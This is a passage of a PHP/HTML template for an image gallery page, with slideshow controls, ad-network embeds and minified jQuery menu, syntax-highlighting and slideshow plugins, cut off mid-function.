                <iframe data-aa='689811' src='//ad.a-ads.com/689811?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>            
                <iframe data-aa='691940' src='//ad.a-ads.com/691940?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
                <iframe data-aa='691957' src='//ad.a-ads.com/691957?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
                
            <?php }?>
            </center>    
<section class="cntr">
    <div class="m10">
            
        <center>
            
            <?php if($detect->isMobile()){?>
            
            <span class="title">Gallery <b>-</b> Pictures: </span><b><span id="imagem_atual"></span> of <span id="total_de_imagens"></span></b>
            <span class="recarregar">
                <i class="material-icons small">refresh</i>
            </span>
            <br><br>
            <b>     
            <span class="automatico">
                <i class="material-icons small">play_circle_outline</i>
            </span>            
            <span class="automatico_velocidade oculto">
                <i class="material-icons small">timer</i>s                
            </span>            
            <span class="parado">
                <i class="material-icons small">pause_circle_outline</i>
            </span>            
            <span class="effects">
                <i class="material-icons small">flip</i>
            </span>            
            <span id="controles" class="controles">
                <i class="material-icons small">navigate_before</i>
                <i class="material-icons small">navigate_next</i>
            </span>
            <span class="resolution">
                <i class="material-icons small">photo_size_select_large</i>
            </span>
            <span class="pesquisar">
                <i class="material-icons small">search</i>
            </span><br><br><span class="current_resolution"></span>
            <?php echo $link_video;?>
            </b>
            <?php }else{?>
            
            <span class="title">Gallery <b>-</b> Pictures: </span><b><span id="imagem_atual"></span> of <span id="total_de_imagens"></span></b>
            <span class="recarregar tooltipped" data-position="bottom" data-delay="50" data-tooltip="Reload gallery">
                <i class="material-icons small">refresh</i>
            </span>
            <br><br>
            <b>     
            <span class="automatico tooltipped" data-position="top" data-delay="50" data-tooltip="Start auto slide">
                <i class="material-icons small">play_circle_outline</i>
            </span>            
            <span class="automatico_velocidade oculto tooltipped" data-position="top" data-delay="50" data-tooltip="Seconds to next slide">
                <i class="material-icons small">timer</i>s                
            </span>            
            <span class="parado tooltipped" data-position="top" data-delay="50" data-tooltip="Stop auto slide">
                <i class="material-icons small">pause_circle_outline</i>
            </span>            
            <span class="effects tooltipped" data-position="top" data-delay="50" data-tooltip="Fading in transition">
                <i class="material-icons small">flip</i>
            </span>            
            <span id="controles" class="controles  tooltipped" data-position="top" data-delay="50" data-tooltip="Display Controls">
                <i class="material-icons small">navigate_before</i>
                <i class="material-icons small">navigate_next</i>
            </span>
            <span class="resolution">
                <i class="material-icons small tooltipped" data-position="top" data-delay="50" data-tooltip="Edit image resolution">photo_size_select_large</i>
            </span>
            <span class="pesquisar tooltipped" data-position="top" data-delay="50" data-tooltip="Search image">
                <i class="material-icons small">search</i>
            </span><br><br><span class="current_resolution tooltipped" data-position="top" data-delay="50" data-tooltip="Current Resolution"></span>
            <?php echo $link_video;?>
            </b>
            <?php }?>
        </center>        
        <div class="cntr mt20 div_galeria"><ul id="galeria_de_imagens" class="pgwSlideshow"><li></li></ul></div>
    </div>    
</section>
<section class="cntr mt10"> <!-- add class 'tac' to center-->
    <div class="ml10 mr10 fs08"> 
    <?php 
    
    //(link - )(link - )(link - )(link - )(link -)(link)   
    
    $link_all_galleries = file_exists("docs/links/link_all_galleries.txt");
    $link_new_gallery = file_exists("docs/links/link_new_gallery.txt");
    $link_download_script = file_exists("docs/links/link_download_script.txt");
    $link_terms = file_exists("docs/links/link_terms.txt");
    $link_admin = file_exists("docs/links/link_admin.txt");
    ?>
        
    <?php if($link_all_galleries){?>
    <span class="fcc4 allGalleries" title="All Galleries">All Galleries</span>
        <?php //verifica se é preciso haver um separador
        if($link_new_gallery||$link_download_script||$link_terms||$link_admin){ ?>
        <b class="separador"> - </b>
        <?php } ?>    
    <?php }/*file_exists*/ ?>
    
    <?php if($link_new_gallery){?>    
    <span class="fcc4 newGallery" title="Create new gallery">New Gallery</span> 
        <?php //verifica se é preciso haver um separador 
        if($link_download_script||$link_terms||$link_admin){ ?>
        <b class="separador"> - </b>
        <?php } ?>    
    <?php }/*file_exists*/ ?>
    
    <?php if($link_download_script){?> 
    <span class="fcc4 download" title="Download script">Download Script</span>
        <?php //verifica se é preciso haver um separador 
        if($link_terms||$link_admin){ ?>
        <b class="separador"> - </b>
        <?php } ?>
    <?php }/*file_exists*/ ?>
   
    <?php if($link_terms){?>
    <span class="fcc4 terms" title="Terms of service">Terms</span>
        <?php //verifica se é preciso haver um separador 
        if($link_admin){ ?>
        <b class="separador"> - </b>
        <?php } ?>
    <?php }/*file_exists*/ ?>
    
    <?php if($link_admin){?>
    <span class="fcc4 admin" title="Admin">Admin</span>
    <?php }/*file_exists*/ ?>
    
    </div>
</section>
<footer class="cntr">
    <div></div>
</footer>
<center>
<?php if($detect->isMobile()){ ?>
<iframe data-aa='689811' src='//ad.a-ads.com/689811?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='691940' src='//ad.a-ads.com/691940?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='691957' src='//ad.a-ads.com/691957?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<br>
<?php } ?>

<!-- ad 1 -->
<script type="text/javascript">
var ad_idzone = "2673154",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2673154" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2673154&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 2 -->
<script type="text/javascript">
var ad_idzone = "2663262",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exoclick.com/ads.js"></script>
<noscript><a href="https://main.exoclick.com/img-click.php?idzone=2663262" target="_blank"><img src="https://syndication.exoclick.com/ads-iframe-display.php?idzone=2663262&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 3 -->
<script type="text/javascript">
var ad_idzone = "2663268",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exoclick.com/ads.js"></script>
<noscript><a href="https://main.exoclick.com/img-click.php?idzone=2663268" target="_blank"><img src="https://syndication.exoclick.com/ads-iframe-display.php?idzone=2663268&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 4 -->
<script type="text/javascript">
var ad_idzone = "2663288",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2663288" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2663288&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 5 -->
<script type="text/javascript">
var ad_idzone = "2672522",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2672522" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2672522&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 6 -->
<script type="text/javascript">
var ad_idzone = "2685548",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2685548" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2685548&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 7 -->
<script type="text/javascript">
var ad_idzone = "2685552",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2685552" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2685552&output=img&type=300x250" width="300" height="250"></a></noscript>

<!-- ad 8 -->
<script type="text/javascript">
var ad_idzone = "2685554",
	 ad_width = "300",
	 ad_height = "250";
</script>
<script type="text/javascript" src="https://ads.exosrv.com/ads.js"></script>
<noscript><a href="https://main.exosrv.com/img-click.php?idzone=2685554" target="_blank"><img src="https://syndication.exosrv.com/ads-iframe-display.php?idzone=2685554&output=img&type=300x250" width="300" height="250"></a></noscript>

</center>             
<script type="text/javascript" src="https://syndication.exosrv.com/splash.php?idzone=2580251&capping=0"></script>
<script type="text/javascript">
(function($){$.fn.pgwMenu=function(options){var defaults={mainClassName:'pgwMenu',dropDownLabel:'<span class="icon"></span>',viewMoreEnabled:true,viewMoreLabel:'View more <span class="icon"></span>',viewMoreMaxWidth:480};if(this.length==0){return this;}else if(this.length>1){this.each(function(){$(this).pgwMenu(options);});return this;}var pgwMenu=this;pgwMenu.plugin=this;pgwMenu.config={};pgwMenu.resizeEvent=null;pgwMenu.window=$(window);var init=function(){pgwMenu.config=$.extend({},defaults,options);setup();pgwMenu.checkMenu();pgwMenu.window.resize(function(){pgwMenu.plugin.css('overflow','hidden');clearTimeout(pgwMenu.resizeEvent);pgwMenu.resizeEvent=setTimeout(function(){pgwMenu.checkMenu();},100);});pgwMenu.plugin.find('.pm-dropDown').click(function(e){pgwMenu.enableMobileDropDown();e.stopPropagation();});pgwMenu.plugin.find('.pm-viewMore').click(function(e){pgwMenu.enableViewMoreDropDown();e.stopPropagation();});$(document).click(function(){pgwMenu.disableMobileDropDown();pgwMenu.disableViewMoreDropDown();});};var setup=function(){var wrapClass=pgwMenu.config.mainClassName;var defaultClass=pgwMenu.plugin.attr('class');if(defaultClass&&defaultClass.indexOf('light')>-1){wrapClass+=' light';}pgwMenu.plugin.removeClass().addClass('pm-links');pgwMenu.plugin.wrap('<div class="'+wrapClass+'"></div>');pgwMenu.plugin=pgwMenu.plugin.parent();pgwMenu.plugin.prepend('<div class="pm-dropDown"><a href="javascript:void(0)">'+pgwMenu.config.dropDownLabel+'</a></div>');if(pgwMenu.config.viewMoreEnabled){pgwMenu.plugin.append('<div class="pm-viewMore" style="display:inline-block"><a href="javascript:void(0)">'+pgwMenu.config.viewMoreLabel+'</a><ul></ul></div>');}};pgwMenu.checkMenu=function(){var pluginMaxWidth=pgwMenu.plugin.width();if(pgwMenu.config.viewMoreEnabled){var viewMoreLinkWidth=pgwMenu.plugin.find('.pm-viewMore').outerWidth(true);}function getContentWidth(){var menuContentWidth=0;pgwMenu.plugin.find('.pm-links').removeClass('mobile').show();pgwMenu.plugin.find('.pm-links > li').each(function(){menuContentWidth+=$(this).outerWidth(true);});return menuContentWidth;}function switchMenu(type){if(type=='viewmore'){var viewMoreMenuWidth=viewMoreLinkWidth;pgwMenu.plugin.find('.pm-links').removeClass('mobile').show();pgwMenu.plugin.find('.pm-viewMore > ul > li').remove();pgwMenu.plugin.find('.pm-links > li').show().each(function(){if(viewMoreMenuWidth+$(this).outerWidth(true)<pluginMaxWidth){viewMoreMenuWidth+=$(this).outerWidth(true);}else{pgwMenu.plugin.find('.pm-viewMore > ul').append($(this).clone().show());$(this).hide();}});pgwMenu.plugin.find('.pm-dropDown, .pm-viewMore > ul').hide();pgwMenu.plugin.find('.pm-viewMore').show();}else if(type=='dropdown'){pgwMenu.plugin.find('.pm-links > li').show();pgwMenu.plugin.find('.pm-links').addClass('mobile').hide();pgwMenu.plugin.find('.pm-viewMore, .pm-viewMore > ul').hide();pgwMenu.plugin.find('.pm-viewMore > ul > li').remove();pgwMenu.plugin.find('.pm-dropDown').show();}else{pgwMenu.plugin.find('.pm-links > li').show();pgwMenu.plugin.find('.pm-links').removeClass('mobile').show();pgwMenu.plugin.find('.pm-dropDown, .pm-viewMore, .pm-viewMore > ul').hide();pgwMenu.plugin.find('.pm-viewMore > ul > li').remove();}pgwMenu.plugin.find('.pm-dropDown > a, .pm-viewMore > a').removeClass('active');}if(getContentWidth()>pluginMaxWidth){if(pgwMenu.config.viewMoreEnabled&&(pluginMaxWidth>pgwMenu.config.viewMoreMaxWidth)){switchMenu('viewmore');}else{switchMenu('dropdown');}}else{switchMenu('normal');}pgwMenu.plugin.css('overflow','');};pgwMenu.enableViewMoreDropDown=function(){if(pgwMenu.plugin.find('.pm-viewMore > a').hasClass('active')){pgwMenu.disableViewMoreDropDown();return false;}pgwMenu.plugin.find('.pm-viewMore > a').addClass('active');pgwMenu.plugin.find('.pm-viewMore > ul').show();};pgwMenu.disableViewMoreDropDown=function(){if(pgwMenu.plugin.find('.pm-viewMore > a').hasClass('active')){pgwMenu.plugin.find('.pm-viewMore > a').removeClass('active');pgwMenu.plugin.find('.pm-viewMore > ul').hide();}};pgwMenu.enableMobileDropDown=function(){if(pgwMenu.plugin.find('.pm-dropDown > a').hasClass('active')){pgwMenu.disableMobileDropDown();return false;}pgwMenu.plugin.find('.pm-dropDown > a').addClass('active');pgwMenu.plugin.find('.pm-links').show();};pgwMenu.disableMobileDropDown=function(){if(pgwMenu.plugin.find('.pm-dropDown > a').hasClass('active')){pgwMenu.plugin.find('.pm-dropDown > a').removeClass('active');pgwMenu.plugin.find('.pm-links').hide();}};init();return this;}})(window.Zepto||window.jQuery);
window.Rainbow=function(){function A(a){var b=a.getAttribute("data-language")||a.parentNode.getAttribute("data-language");if(!b){var c=/\blang(?:uage)?-(\w+)/;(a=a.className.match(c)||a.parentNode.className.match(c))&&(b=a[1])}return b}function B(a,b){for(var c in f[d]){c=parseInt(c,10);if(a==c&&b==f[d][c]?0:a<=c&&b>=f[d][c])delete f[d][c],delete j[d][c];if(a>=c&&a<f[d][c]||b>c&&b<f[d][c])return!0}return!1}function q(a,b){return'<span class="'+a.replace(/\./g," ")+(l?" "+l:"")+'">'+b+"</span>"}function r(a,b,c,i){if("undefined"===typeof a||null===a)i();else{var e=a.exec(c);if(e){++s;!b.name&&"string"==typeof b.matches[0]&&(b.name=b.matches[0],delete b.matches[0]);var k=e[0],g=e.index,t=e[0].length+g,h=function(){function e(){r(a,b,c,i)}s%100>0?e():setTimeout(e,0)};if(B(g,t))h();else{var m=u(b.matches),l=function(a,c,i){if(a>=c.length)i(k);else{var d=e[c[a]];if(d){var g=b.matches[c[a]],f=g.language,h=g.name&&g.matches?g.matches:g,j=function(b,d,g){var f;f=0;var h;for(h=1;h<c[a];++h)e[h]&&(f=f+e[h].length);d=g?q(g,d):d;k=k.substr(0,f)+k.substr(f).replace(b,d);l(++a,c,i)};f?n(d,f,function(a){j(d,a)}):typeof g==="string"?j(d,d,g):v(d,h.length?h:[h],function(a){j(d,a,g.matches?g.name:0)})}else l(++a,c,i)}};l(0,m,function(a){b.name&&(a=q(b.name,a));if(!j[d]){j[d]={};f[d]={}}j[d][g]={replace:e[0],"with":a};f[d][g]=t;h()})}}else i()}}function u(a){var b=[],c;for(c in a)a.hasOwnProperty(c)&&b.push(c);return b.sort(function(a,c){return c-a})}function v(a,b,c){function i(b,k){k<b.length?r(b[k].pattern,b[k],a,function(){i(b,++k)}):C(a,function(a){delete j[d];delete f[d];--d;c(a)})}++d;i(b,0)}function C(a,b){function c(a,b,i,f){if(i<b.length){++w;var h=b[i],l=j[d][h],a=a.substr(0,h)+a.substr(h).replace(l.replace,l["with"]),h=function(){c(a,b,++i,f)};0<w%250?h():setTimeout(h,0)}else f(a)}var i=u(j[d]);c(a,i,0,b)}function n(a,b,c){var d=m[b]||[],e=m[x]||[],b=y[b]?d:d.concat(e);v(a.replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/&(?![\w\#]+;)/g,"&amp;"),b,c)}function o(a,b,c){if(b<a.length){var d=a[b],e=A(d);return!(-1<(" "+d.className+" ").indexOf(" rainbow "))&&e?(e=e.toLowerCase(),d.className+=d.className?" rainbow":"rainbow",n(d.innerHTML,e,function(k){d.innerHTML=k;j={};f={};p&&p(d,e);setTimeout(function(){o(a,++b,c)},0)})):o(a,++b,c)}c&&c()}function z(a,b){var a=a&&"function"==typeof a.getElementsByTagName?a:document,c=a.getElementsByTagName("pre"),d=a.getElementsByTagName("code"),e,f=[],g=[];for(e=0;e<c.length;++e)c[e].getElementsByTagName("code").length?c[e].innerHTML=c[e].innerHTML.replace(/^\s+/,"").replace(/\s+$/,""):f.push(c[e]);for(e=0;e<d.length;++e)g.push(d[e]);o(g.concat(f),0,b)}var j={},f={},m={},y={},d=0,x=0,s=0,w=0,l,p;return{extend:function(a,b,c){1==arguments.length&&(b=a,a=x);y[a]=c;m[a]=b.concat(m[a]||[])},b:function(a){p=a},a:function(a){l=a},color:function(a,b,c){if("string"==typeof a)return n(a,b,c);if("function"==typeof a)return z(0,a);z(a,b)}}}();document.addEventListener&&document.addEventListener("DOMContentLoaded",Rainbow.color,!1);Rainbow.onHighlight=Rainbow.b;Rainbow.addClass=Rainbow.a;Rainbow.extend([{matches:{1:[{name:"keyword.operator",pattern:/\=|\+/g},{name:"keyword.dot",pattern:/\./g}],2:{name:"string",matches:{name:"constant.character.escape",pattern:/\\('|"){1}/g}}},pattern:/(\(|\s|\[|\=|:|\+|\.)(('|")([^\\\1]|\\.)*?(\3))/gm},{name:"comment",pattern:/\/\*[\s\S]*?\*\/|(\/\/|\#)[\s\S]*?$/gm},{name:"constant.numeric",pattern:/\b(\d+(\.\d+)?(e(\+|\-)?\d+)?(f|d)?|0x[\da-f]+)\b/gi},{matches:{1:"keyword"},pattern:/\b(and|array|as|b(ool(ean)?|reak)|c(ase|atch|har|lass|on(st|tinue))|d(ef|elete|o(uble)?)|e(cho|lse(if)?|xit|xtends|xcept)|f(inally|loat|or(each)?|unction)|global|if|import|int(eger)?|long|new|object|or|pr(int|ivate|otected)|public|return|self|st(ring|ruct|atic)|switch|th(en|is|row)|try|(un)?signed|var|void|while)(?=\(|\b)/gi},{name:"constant.language",pattern:/true|false|null/g},{name:"keyword.operator",pattern:/\+|\!|\-|&(gt|lt|amp);|\||\*|\=/g},{matches:{1:"function.call"},pattern:/(\w+?)(?=\()/g},{matches:{1:"storage.function",2:"entity.name.function"},pattern:/(function)\s(.*?)(?=\()/g}]);Rainbow.extend("javascript",[{name:"selector",pattern:/(\s|^)\$(?=\.|\()/g},{name:"support",pattern:/\b(window|document)\b/g},{matches:{1:"support.property"},pattern:/\.(length|node(Name|Value))\b/g},{matches:{1:"support.function"},pattern:/(setTimeout|setInterval)(?=\()/g},{matches:{1:"support.method"},pattern:/\.(getAttribute|push|getElementById|getElementsByClassName|log|setTimeout|setInterval)(?=\()/g},{name:"string.regexp",matches:{1:"string.regexp.open",2:{name:"constant.regexp.escape",pattern:/\\(.){1}/g},3:"string.regexp.close",4:"string.regexp.modifier"},pattern:/(\/)(?!\*)(.+)(\/)([igm]{0,3})/g},{matches:{1:"storage",3:"entity.function"},pattern:/(var)?(\s|^)(\S*)(?=\s?=\s?function\()/g},{matches:{1:"keyword",2:"entity.function"},pattern:/(new)\s+(.*)(?=\()/g},{name:"entity.function",pattern:/(\w+)(?=:\s{0,}function)/g}]);Rainbow.extend("html",[{name:"source.php.embedded",matches:{2:{language:"php"}},pattern:/&lt;\?=?(?!xml)(php)?([\s\S]*?)(\?&gt;)/gm},{name:"source.css.embedded",matches:{1:{matches:{1:"support.tag.style",2:[{name:"entity.tag.style",pattern:/^style/g},{name:"string",pattern:/('|")(.*?)(\1)/g},{name:"entity.tag.style.attribute",pattern:/(\w+)/g}],3:"support.tag.style"},pattern:/(&lt;\/?)(style.*?)(&gt;)/g},2:{language:"css"},3:"support.tag.style",4:"entity.tag.style",5:"support.tag.style"},pattern:/(&lt;style.*?&gt;)([\s\S]*?)(&lt;\/)(style)(&gt;)/gm},{name:"source.js.embedded",matches:{1:{matches:{1:"support.tag.script",2:[{name:"entity.tag.script",pattern:/^script/g},{name:"string",pattern:/('|")(.*?)(\1)/g},{name:"entity.tag.script.attribute",pattern:/(\w+)/g}],3:"support.tag.script"},pattern:/(&lt;\/?)(script.*?)(&gt;)/g},2:{language:"javascript"},3:"support.tag.script",4:"entity.tag.script",5:"support.tag.script"},pattern:/(&lt;script(?! src).*?&gt;)([\s\S]*?)(&lt;\/)(script)(&gt;)/gm},{name:"comment.html",pattern:/&lt;\!--[\S\s]*?--&gt;/g},{matches:{1:"support.tag.open",2:"support.tag.close"},pattern:/(&lt;)|(\/?\??&gt;)/g},{name:"support.tag",matches:{1:"support.tag",2:"support.tag.special",3:"support.tag-name"},pattern:/(&lt;\??)(\/|\!?)(\w+)/g},{matches:{1:"support.attribute"},pattern:/([a-z-]+)(?=\=)/gi},{matches:{1:"support.operator",2:"string.quote",3:"string.value",4:"string.quote"},pattern:/(=)('|")(.*?)(\2)/g},{matches:{1:"support.operator",2:"support.value"},pattern:/(=)([a-zA-Z\-0-9]*)\b/g},{matches:{1:"support.attribute"},pattern:/\s(\w+)(?=\s|&gt;)(?![\s\S]*&lt;)/g}],!0);
(function(a){a.fn.pgwSlideshow=function(q){var i={mainClassName:"pgwSlideshow",transitionEffect:"sliding",displayList:true,displayControls:true,touchControls:true,autoSlide:false,beforeSlide:false,afterSlide:false,maxHeight:null,adaptiveDuration:200,transitionDuration:500,intervalDuration:3000};if(this.length==0){return this}else{if(this.length>1){this.each(function(){a(this).pgwSlideshow(q)});return this}}var j=this;j.plugin=this;j.config={};j.data=[];j.currentSlide=0;j.slideCount=0;j.resizeEvent=null;j.intervalEvent=null;j.touchFirstPosition=null;j.touchListLastPosition=false;j.window=a(window);var p=function(){j.config=a.extend({},i,q);g();if(j.config.displayList){b()}j.window.resize(function(){clearTimeout(j.resizeEvent);j.resizeEvent=setTimeout(function(){e();var r=j.plugin.find(".ps-current > ul > li.elt_"+j.currentSlide+" img").height();h(r);if(j.config.displayList){b();n()}},100)});if(j.config.autoSlide){k()}return true};var h=function(r,s){if(j.config.maxHeight){if(r+j.plugin.find(".ps-list").height()>j.config.maxHeight){r=j.config.maxHeight-j.plugin.find(".ps-list").height()}}if(typeof j.plugin.find(".ps-current").animate=="function"){j.plugin.find(".ps-current").stop().animate({height:r},j.config.adaptiveDuration,function(){if(j.config.maxHeight){j.plugin.find(".ps-current > ul > li img").css("max-height",r+"px")}})}else{j.plugin.find(".ps-current").css("height",r);if(j.config.maxHeight){j.plugin.find(".ps-current > ul > li img").css("max-height",r+"px")}}return true};var c=function(){var r=0;j.plugin.show();j.plugin.find(".ps-list > ul > li").show().each(function(){r+=a(this).width()});j.plugin.find(".ps-list > ul").width(r);return true};var e=function(){if(j.plugin.width()<=480){j.plugin.addClass("narrow").removeClass("wide")}else{j.plugin.addClass("wide").removeClass("narrow")}return true};var g=function(){j.plugin.removeClass("pgwSlideshow").removeClass(j.config.mainClassName);j.plugin.wrap('<div class="ps-list"></div>');j.plugin=j.plugin.parent();j.plugin.wrap('<div class="'+j.config.mainClassName+'"></div>');j.plugin=j.plugin.parent();j.plugin.prepend('<div class="ps-current"><ul></ul><span class="ps-caption"></span></div>');j.slideCount=j.plugin.find(".ps-list > ul > li").length;if(j.slideCount==0){throw new Error("pgwSlideshow - No slider item has been found");return false}if(j.slideCount>1){if(j.config.displayControls){j.plugin.find(".ps-current").prepend('<span class="ps-prev"><span class="ps-prevIcon"></span></span>');j.plugin.find(".ps-current").append('<span class="ps-next"><span class="ps-nextIcon"></span></span>');j.plugin.find(".ps-current .ps-prev").click(function(){j.previousSlide();});j.plugin.find(".ps-current .ps-next").click(function(){j.nextSlide()})}if(j.config.touchControls){j.plugin.find(".ps-current").on("touchstart",function(s){try{if(s.originalEvent.touches[0].clientX&&j.touchFirstPosition==null){j.touchFirstPosition=s.originalEvent.touches[0].clientX}}catch(s){j.touchFirstPosition=null}});j.plugin.find(".ps-current").on("touchmove",function(s){try{if(s.originalEvent.touches[0].clientX&&j.touchFirstPosition!=null){if(s.originalEvent.touches[0].clientX>(j.touchFirstPosition+50)){j.touchFirstPosition=null;j.previousSlide()}else{if(s.originalEvent.touches[0].clientX<(j.touchFirstPosition-50)){j.touchFirstPosition=null;j.nextSlide()}}}}catch(s){j.touchFirstPosition=null}});j.plugin.find(".ps-current").on("touchend",function(s){j.touchFirstPosition=null})}}var r=1;j.plugin.find(".ps-list > ul > li").each(function(){var t=d(a(this));t.id=r;j.data.push(t);a(this).addClass("elt_"+t.id);a(this).wrapInner('<span class="ps-item'+(r==1?" ps-selected":"")+'"></span>');var s=a('<li class="elt_'+r+'"></li>');if(t.image){s.html('<img src="'+t.image+'" alt="'+(t.title?t.title:"")+'">')}else{if(t.thumbnail){s.html('<img src="'+t.thumbnail+'" alt="'+(t.title?t.title:"")+'">')}}if(t.link){s.html('<a href="'+t.link+'"'+(t.linkTarget?' target="'+t.linkTarget+'"':"")+">"+s.html()+"</a>")}j.plugin.find(".ps-current > ul").append(s);a(this).css("cursor","pointer").click(function(u){u.preventDefault();l(t.id)});r++});if(j.config.displayList){c();j.plugin.find(".ps-list").prepend('<span class="ps-prev"><span class="ps-prevIcon"></span></span>');j.plugin.find(".ps-list").append('<span class="ps-next"><span class="ps-nextIcon"></span></span>');j.plugin.find(".ps-list").show()}else{j.plugin.find(".ps-list").hide()}if(j.config.autoSlide){j.plugin.on("mouseenter",function(){clearInterval(j.intervalEvent);j.intervalEvent=null}).on("mouseleave",function(){k()})}j.plugin.find(".ps-current > ul > li").hide();l(1);j.plugin.find(".ps-current > ul > li.elt_1 img").on("load",function(){e();var s=j.plugin.find(".ps-current > ul > li.elt_1 img").height();h(s)});e();j.plugin.show();return true};var d=function(x){var v={};var t=x.find("a").attr("href");if((typeof t!="undefined")&&(t!="")){v.link=t;var u=x.find("a").attr("target");if((typeof u!="undefined")&&(u!="")){v.linkTarget=u}}var s=x.find("img").attr("src");if((typeof s!="undefined")&&(s!="")){v.thumbnail=s}var y=x.find("img").attr("data-large-src");if((typeof y!="undefined")&&(y!="")){v.image=y}var r=x.find("img").attr("alt");if((typeof r!="undefined")&&(r!="")){v.title=r}var w=x.find("img").attr("data-description");if((typeof w!="undefined")&&(w!="")){v.description=w}return v};var m=function(r){var t="";if(r.title){t+="<b>"+r.title+"</b>"}if(r.description){if(t!=""){t+="<br>"}t+=r.description}if(t!=""){if(r.link){t='<a href="'+r.link+'"'+(r.linkTarget?' target="'+r.linkTarget+'"':"")+">"+t+"</a>"}if(typeof j.plugin.find(".ps-caption").fadeIn=="function"){j.plugin.find(".ps-caption").html(t);j.plugin.find(".ps-caption").fadeIn(j.config.transitionDuration/2)}else{j.plugin.find(".ps-caption").html(t);j.plugin.find(".ps-caption").show()}}j.plugin.find(".ps-list > ul > li .ps-item").removeClass("ps-selected");j.plugin.find(".ps-list > ul > li.elt_"+r.id+" .ps-item").addClass("ps-selected");if(j.config.displayList){b();n()}if(j.config.displayControls){if(typeof j.plugin.find(".ps-current > .ps-prev").fadeIn=="function"){j.plugin.find(".ps-current > .ps-prev, .ps-current > .ps-next").fadeIn(j.config.transitionDuration/2)}else{j.plugin.find(".ps-current > .ps-prev, .ps-current > .ps-next").show()}}if(typeof j.config.afterSlide=="function"){j.config.afterSlide(r.id)}var s=j.plugin.find(".ps-current .elt_"+r.id+" img").height();h(s,true);return true};var f=function(u){var t=j.plugin.find(".ps-current > ul");t.find("li").not(".elt_"+j.currentSlide).not(".elt_"+u.id).each(function(){if(typeof a(this).stop=="function"){a(this).stop()}a(this).css("position","").css("z-index",1).hide()});if(j.currentSlide>0){var r=t.find(".elt_"+j.currentSlide);if(typeof r.animate!="function"){r.animate=function(v,w,x){r.css(v);if(x){x()}}}if(typeof r.stop=="function"){r.stop()}r.css("position","absolute").animate({opacity:0},j.config.transitionDuration,function(){r.css("position","").css("z-index",1).hide()})}j.currentSlide=u.id;var s=t.find(".elt_"+u.id);if(typeof s.animate!="function"){s.animate=function(v,w,x){s.css(v);if(x){x()}}}if(typeof s.stop=="function"){s.stop()}s.css("position","absolute").show().animate({opacity:1},j.config.transitionDuration,function(){s.css("position","").css("z-index",2).css("display","block");m(u)});return true};var o=function(v,y){var u=j.plugin.find(".ps-current > ul");if(typeof y=="undefined"){y="left"}if(j.currentSlide==0){u.find(".elt_1").css({position:"",left:"",opacity:1,"z-index":2}).show();j.plugin.find(".ps-list > li.elt_1").css("opacity","1");m(v)}else{if(j.transitionInProgress){return false}j.transitionInProgress=true;var x=u.width();if(y=="left"){var r=-x;var w=x}else{var r=x;var w=-x}var s=u.find(".elt_"+j.currentSlide);if(typeof s.animate!="function"){s.animate=function(z,A,B){s.css(z);if(B){B()}}}s.css("position","absolute").animate({left:r},j.config.transitionDuration,function(){s.css("position","").css("z-index",1).css("left","").css("opacity",0).hide()});var t=u.find(".elt_"+v.id);if(typeof t.animate!="function"){t.animate=function(z,A,B){t.css(z);if(B){B()}}}t.css("position","absolute").css("left",w).css("opacity",1).show().animate({left:0},j.config.transitionDuration,function(){t.css("position","").css("left","").css("z-index",2).show();j.transitionInProgress=false;m(v)})}j.currentSlide=v.id;return true};var l=function(r,t,u){if(r==j.currentSlide){return false}var s=j.data[r-1];if(typeof s=="undefined"){throw new Error("pgwSlideshow - The element "+r+" is undefined");return false}if(typeof u=="undefined"){u="left"}if(typeof j.config.beforeSlide=="function"){j.config.beforeSlide(r)}if(typeof j.plugin.find(".ps-caption").fadeOut=="function"){j.plugin.find(".ps-caption, .ps-prev, .ps-next").fadeOut(j.config.transitionDuration/2)}else{j.plugin.find(".ps-caption, .ps-prev, .ps-next").hide()}if(j.config.transitionEffect=="sliding"){o(s,u)}else{f(s)}if(typeof t!="undefined"&&j.config.autoSlide){k()}return true};var k=function(){clearInterval(j.intervalEvent);if(j.slideCount>1&&j.config.autoSlide){j.intervalEvent=setInterval(function(){if(j.currentSlide+1<=j.slideCount){var r=j.currentSlide+1}else{var 